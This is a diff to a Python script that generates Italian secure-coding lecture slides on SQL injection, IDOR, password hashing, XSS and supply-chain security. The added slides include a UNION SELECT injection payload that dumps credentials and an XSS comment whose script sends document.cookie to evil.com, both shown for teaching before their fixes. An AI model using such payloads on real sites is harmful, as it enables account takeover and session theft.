@@ -923,7 +923,7 @@ def make_l2():
 
 def make_l3():
     prs = new_pres()
-    total = 14
+    total = 15
     LL = "L3"
 
     slide_cover(prs, "3", "SQL Injection",
@@ -954,11 +954,31 @@ def make_l3():
                  f"{IMG}/cap3_sqli_attack.png", 6, total,
                  "Una richiesta HTTP, una sessione admin. Senza credenziali.")
 
+    slide_code(prs, LL, "UNION SELECT — estrazione dati (peggio del bypass)",
+                """# La pagina /cerca è vulnerabile a SQLi:
+# sql = f"SELECT contenuto FROM messaggi WHERE contenuto LIKE '%{q}%'"
+
+# L'attaccante cerca:
+xyz' UNION SELECT email || ':' || password FROM users --
+
+# La query diventa:
+# SELECT contenuto FROM messaggi WHERE contenuto LIKE
+#     '%xyz' UNION SELECT email || ':' || password FROM users --%'
+
+# L'app mostra "messaggi"... ma in realtà mostra TUTTE le password:
+#   alice@bank.it:alice_pass
+#   bob@bank.it:bob_pass
+#   admin@bank.it:Sup3rS3gr3t0!
+
+# In UNA richiesta: TUTTO il database password rubato.""",
+                7, total, lang_label="sql", bad=True,
+                note="Login bypass + UNION SELECT = takeover di ogni account in <30 secondi")
+
     slide_section(prs, LL, "02", "La correzione",
-                   "Separare struttura SQL da dati. Sempre.", 7, total)
+                   "Separare struttura SQL da dati. Sempre.", 8, total)
 
     slide_image(prs, LL, "Versione corretta",
-                 f"{IMG}/cap3_sqli_safe.png", 8, total,
+                 f"{IMG}/cap3_sqli_safe.png", 9, total,
                  "Query parametrizzata: il driver tratta i dati come VALORI, mai come SQL")
 
     slide_two_col(prs, LL, "Filtrare gli apici NON funziona",
@@ -983,7 +1003,7 @@ def make_l3():
                     "non viene interpretato",
                     "",
                     "Whitelist > Blacklist (sempre)"],
-                   9, total)
+                   10, total)
 
     slide_table(prs, LL, "Cross-linguaggio: la stessa idea",
                  ["Linguaggio", "Pattern parametrizzato"],
@@ -994,7 +1014,7 @@ def make_l3():
                      ["PHP PDO", "$stmt = $pdo->prepare(\"... = ?\")"],
                      ["JS better-sqlite3", "db.prepare(\"... = ?\").get(val)"],
                      ["ORM (SQLAlchemy, ...)", "User.query.filter_by(email=email).first()"],
-                 ], 10, total)
+                 ], 11, total)
 
     slide_content(prs, LL, "Difese in profondità", [
         "1. Query parametrizzate (difesa PRIMARIA, non sostituibile)",
@@ -1004,7 +1024,7 @@ def make_l3():
         "5. WAF (Web Application Firewall) come strato aggiuntivo",
         "6. Rate limiting sul login (anti brute force)",
         "7. Audit log dei tentativi sospetti",
-    ], 11, total, emoji="🛡")
+    ], 12, total, emoji="🛡")
 
     slide_takeaway(prs, LL, [
         "SQLi è la #1 dal 2003: Equifax, Heartland, TalkTalk",
@@ -1012,13 +1032,13 @@ def make_l3():
         "Filtrare gli apici è una strategia perdente",
         "ORM è più sicuro per default",
         "Difese stratificate: 7 livelli di protezione",
-    ], 12, total)
+    ], 13, total)
 
     slide_section(prs, LL, "03", "Laboratorio",
                    "Mini-banca: app vulnerabile → la sfrutti → la correggi",
-                   13, total)
+                   14, total)
 
-    slide_qa(prs, LL, 14, total,
+    slide_qa(prs, LL, 15, total,
               next_lesson="L4 — IDOR + password hashing (bcrypt)")
 
     prs.save("L3_sql_injection.pptx")
@@ -1027,7 +1047,7 @@ def make_l3():
 
 def make_l4():
     prs = new_pres()
-    total = 14
+    total = 15
     LL = "L4"
 
     slide_cover(prs, "4", "Autorizzazione e password",
@@ -1066,8 +1086,23 @@ def make_l4():
                    "Insecure Direct Object Reference (OWASP A01)",
                    4, total)
 
+    slide_content(prs, LL, "Caso reale italiano — 100.000€ di multa",
+                   [
+                       "2022, e-commerce italiano",
+                       "URL /ordine/<id> non protetti",
+                       "Cambiando l'ID nell'URL si vedevano ordini di altri clienti",
+                       "  con indirizzi, prodotti, importi, IBAN",
+                       "",
+                       "Sanzione Garante Privacy: ~100.000€",
+                       "GDPR Art. 25 (Privacy by Design) + Art. 32 (sicurezza)",
+                       "",
+                       "Una sola riga di codice in più avrebbe evitato tutto questo",
+                   ], 5, total,
+                   subtitle="Provvedimento Garante: dati personali esposti senza ownership check",
+                   emoji="⚖")
+
     slide_image(prs, LL, "Soluzione: ownership check",
-                 f"{IMG}/cap4_idor_safe.png", 5, total,
+                 f"{IMG}/cap4_idor_safe.png", 6, total,
                  "filter_by(owner_id=...) è la riga che evita una multa da 100k€")
 
     slide_table(prs, LL, "Status code: 401 vs 403 vs 404",
@@ -1076,11 +1111,11 @@ def make_l4():
                      ["401 Unauthorized", "Non autenticato", "Manca login / token scaduto"],
                      ["403 Forbidden", "Autenticato ma senza permessi", "User normale → /admin"],
                      ["404 Not Found", "Risorsa inesistente", "URL inesistente"],
-                 ], 6, total)
+                 ], 7, total)
 
     slide_section(prs, LL, "02", "Password hashing",
                    "Encoding ≠ Hashing ≠ Encryption — la differenza fondamentale",
-                   7, total)
+                   8, total)
 
     slide_two_col(prs, LL, "Tre operazioni DIVERSE",
                    "❌ NO per password",
@@ -1100,7 +1135,7 @@ def make_l4():
                     "  bcrypt cost=12 ≈ 250ms",
                     "  Utente: impercettibile",
                     "  Attaccante: devastante"],
-                   8, total)
+                   9, total)
 
     slide_content(prs, LL, "Perché MD5/SHA-256 NON vanno", [
         "Velocità: SHA-256 su GPU = miliardi/secondo",
@@ -1112,10 +1147,10 @@ def make_l4():
         "MD5 e SHA-1: collisioni note. Morti definitivamente.",
         "",
         "bcrypt e Argon2id sono progettati apposta per essere LENTI",
-    ], 9, total, emoji="⏱")
+    ], 10, total, emoji="⏱")
 
     slide_image(prs, LL, "bcrypt: l'implementazione corretta",
-                 f"{IMG}/cap4_bcrypt.png", 10, total,
+                 f"{IMG}/cap4_bcrypt.png", 11, total,
                  "Una riga di codice. Salt automatico. Cost configurabile.")
 
     slide_table(prs, LL, "Diagnosi visiva: apri il DB",
@@ -1127,7 +1162,7 @@ def make_l4():
                      ["e3b0c44298fc1c... (64 hex)", "⚠ SHA-256 — inadeguato"],
                      ["$2b$12$KIXbN...", "✅ bcrypt — OK"],
                      ["$argon2id$v=19$...", "✅ Argon2id — ottimo"],
-                 ], 11, total)
+                 ], 12, total)
 
     slide_takeaway(prs, LL, [
         "Authn ≠ Authz — sono due cose diverse",
@@ -1135,13 +1170,13 @@ def make_l4():
         "401 = non autenticato, 403 = non autorizzato",
         "Mai MD5/SHA per password — usa bcrypt o Argon2id",
         "Apri il DB con DB Browser: il visivo è dirimente",
-    ], 12, total)
+    ], 13, total)
 
     slide_section(prs, LL, "03", "Laboratorio",
                    "Aggiungere ownership check e migrare a bcrypt",
-                   13, total)
+                   14, total)
 
-    slide_qa(prs, LL, 14, total,
+    slide_qa(prs, LL, 15, total,
               next_lesson="L5 — XSS + header HTTP di sicurezza")
 
     prs.save("L4_idor_password.pptx")
@@ -1150,7 +1185,7 @@ def make_l4():
 
 def make_l5():
     prs = new_pres()
-    total = 14
+    total = 16
     LL = "L5"
 
     slide_cover(prs, "5", "XSS e header HTTP di sicurezza",
@@ -1165,9 +1200,25 @@ def make_l5():
         "Configurare cookie sicuri (Secure, HttpOnly, SameSite)",
     ], 2, total)
 
+    slide_content(prs, LL, "Una storia: il commento 'rilanciato'",
+                   [
+                       "Immagina un forum dove gli utenti pubblicano commenti",
+                       "Un utente cattivo pubblica un commento che CONTIENE codice:",
+                       "",
+                       "  'Bel post! <script>fetch(\"evil.com?c=\"+document.cookie)</script>'",
+                       "",
+                       "Il forum lo salva pensando sia testo",
+                       "Quando un altro utente apre la pagina, il SUO browser:",
+                       "  1. Legge il commento dal DB",
+                       "  2. Trova <script>...</script> e lo ESEGUE",
+                       "  3. Manda il SUO cookie di sessione all'attaccante",
+                   ], 3, total,
+                   subtitle="Senza chiedere password, l'attaccante ha l'identità della vittima",
+                   emoji="📖")
+
     slide_quote(prs, LL,
                  "XSS = il JavaScript dell'attaccante eseguito nel browser della tua vittima.",
-                 None, 3, total)
+                 None, 4, total)
 
     slide_content(prs, LL, "Come funziona un browser", [
         "1. Scarica HTML della pagina",
@@ -1177,7 +1228,7 @@ def make_l5():
         "",
         "Se l'attaccante riesce a far eseguire del SUO JS nella tua pagina:",
         "→ ha accesso a cookie sessione, dati form, può agire come l'utente",
-    ], 4, total, emoji="🌐")
+    ], 5, total, emoji="🌐")
 
     slide_content(prs, LL, "I 3 tipi di XSS", [
         "REFLECTED — il payload è nell'URL, riflesso nella pagina",
@@ -1188,10 +1239,10 @@ def make_l5():
         "",
         "DOM-BASED — JS della pagina prende valore da location.hash",
         "  Più raro, più subdolo",
-    ], 5, total)
+    ], 6, total)
 
     slide_image(prs, LL, "Flusso di un attacco XSS Stored",
-                 f"{IMG}/cap5_xss_flow.png", 6, total,
+                 f"{IMG}/cap5_xss_flow.png", 7, total,
                  "Dal commento malevolo al furto del cookie di sessione")
 
     slide_code(prs, LL, "Difesa: escape automatico (Jinja2)",
@@ -1206,7 +1257,7 @@ def make_l5():
 # Java + Thymeleaf:  <span th:text="${query}"></span>
 # PHP + Twig:        {{ query }}
 # React:             {query}""",
-                7, total, lang_label="jinja", bad=False,
+                8, total, lang_label="jinja", bad=False,
                 note="Default escape è SEMPRE attivo. Non disabilitarlo con |safe.")
 
     slide_content(prs, LL, "Il pericolo del |safe", [
@@ -1220,10 +1271,31 @@ def make_l5():
         "",
         "Usali solo su testo statico che hai scritto TU.",
         "Mai, MAI, MAI su input utente.",
-    ], 8, total, emoji="⚠")
+    ], 9, total, emoji="⚠")
+
+    slide_code(prs, LL, "Quando l'utente DEVE scrivere HTML ricco: bleach",
+                """# Scenario: commenti con grassetto/corsivo/link → escape NON va
+# Soluzione: sanitization con bleach (whitelist tag+attributi)
+
+import bleach
+
+ALLOWED_TAGS = ["p", "b", "strong", "i", "em", "a", "br"]
+ALLOWED_ATTRS = {"a": ["href"]}
+ALLOWED_PROTO = ["http", "https"]
+
+safe_html = bleach.clean(user_html,
+                          tags=ALLOWED_TAGS,
+                          attributes=ALLOWED_ATTRS,
+                          protocols=ALLOWED_PROTO,
+                          strip=True)
+
+# Input:  <p>Ciao <script>alert(1)</script><a href="javascript:..">x</a></p>
+# Output: <p>Ciao <a>x</a></p>     ← script rimosso, href javascript: rimosso""",
+                10, total, lang_label="python", bad=False,
+                note="bleach mantiene tag voluti, butta tutto il resto. JS in DOMPurify.")
 
     slide_section(prs, LL, "02", "Header HTTP di sicurezza",
-                   "Configurazione rapida, difese potenti", 9, total)
+                   "Configurazione rapida, difese potenti", 11, total)
 
     slide_table(prs, LL, "I 6 header di sicurezza",
                  ["Header", "Cosa fa"],
@@ -1234,7 +1306,7 @@ def make_l5():
                      ["X-Content-Type-Options: nosniff", "Blocca MIME sniffing"],
                      ["Referrer-Policy", "Controlla cosa va nel Referer"],
                      ["Permissions-Policy", "Limita API browser (camera, mic)"],
-                 ], 10, total)
+                 ], 12, total)
 
     slide_code(prs, LL, "Cookie sicuri",
                 """# Configurazione Flask
@@ -1249,21 +1321,21 @@ app.config.update(
 # Set-Cookie: session=abc;
 #             Secure; HttpOnly; SameSite=Lax;
 #             Path=/; Max-Age=3600""",
-                11, total, lang_label="python", bad=False,
+                13, total, lang_label="python", bad=False,
                 note="3 attributi + 1 config = -90% rischio session hijacking")
 
     slide_takeaway(prs, LL, [
         "XSS = JavaScript dell'attaccante eseguito nel browser",
         "3 tipi: Reflected, Stored (peggiore), DOM-based",
         "Jinja2 fa escape di default — NON disabilitarlo",
-        "6 header HTTP, configurazione semplice, difese potenti",
+        "Per HTML ricco voluto: bleach con whitelist",
         "Cookie sessione: Secure + HttpOnly + SameSite (sempre)",
-    ], 12, total)
+    ], 14, total)
 
     slide_section(prs, LL, "03", "Lab + sicurezza headers",
-                   "Test del proprio sito con securityheaders.com", 13, total)
+                   "Test del proprio sito con securityheaders.com", 15, total)
 
-    slide_qa(prs, LL, 14, total,
+    slide_qa(prs, LL, 16, total,
               next_lesson="L6 — Input validation + Supply chain")
 
     prs.save("L5_xss_header.pptx")
@@ -1272,7 +1344,7 @@ app.config.update(
 
 def make_l6():
     prs = new_pres()
-    total = 14
+    total = 15
     LL = "L6"
 
     slide_cover(prs, "6", "Input validation e supply chain",
@@ -1394,15 +1466,32 @@ def download():
                  f"{IMG}/cap6_pip_audit.png", 12, total,
                  "Trovi le CVE → aggiorni → zero vulnerabilità")
 
+    slide_content(prs, LL, "SBOM e Cyber Resilience Act (dicembre 2027)",
+                   [
+                       "SBOM = Software Bill of Materials",
+                       "  Lista completa delle dipendenze del prodotto (versioni, hash)",
+                       "  Formati: CycloneDX, SPDX",
+                       "",
+                       "Cyber Resilience Act (Reg. UE 2024/2847):",
+                       "  In vigore pieno: DICEMBRE 2027",
+                       "  Per ogni 'prodotto digitale' venduto in UE",
+                       "",
+                       "Obblighi: SBOM pubblicato · niente CVE note alla vendita",
+                       "         · patching ≥5 anni · notifica 24h vulnerabilità sfruttate",
+                       "         · sanzioni fino a 15M€ o 2,5% fatturato",
+                   ], 13, total,
+                   subtitle="Iniziate a familiarizzare con pip-audit e cyclonedx-bom ADESSO",
+                   emoji="📜")
+
     slide_takeaway(prs, LL, [
         "Validation, sanitization, encoding: cose DIVERSE",
         "Whitelist sempre. Blacklist mai.",
         "Pydantic per validation strutturata in Python",
         "Path traversal: 3 controlli obbligatori (whitelist, ext, realpath)",
-        "pip-audit in CI: blocca il deploy con CVE Critical",
-    ], 13, total)
+        "pip-audit + SBOM obbligatori dal 2027 (CRA)",
+    ], 14, total)
 
-    slide_qa(prs, LL, 14, total,
+    slide_qa(prs, LL, 15, total,
               next_lesson="L7 — Documentazione sicurezza + uso responsabile AI")
 
     prs.save("L6_validation_supply.pptx")
